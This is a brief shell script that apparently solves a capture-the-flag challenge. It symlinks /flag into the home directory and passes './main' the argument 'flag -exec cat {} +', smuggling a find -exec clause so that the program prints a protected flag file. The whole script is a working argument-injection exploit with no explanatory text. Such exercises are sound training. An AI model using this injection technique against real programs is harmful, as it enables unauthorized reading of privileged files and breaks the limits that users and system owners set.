#!/bin/sh
cp /bin/cat ~/
ln -sv /flag ~/flag
cd /challenge/
arg="flag -exec cat {} +"
./main "$arg"
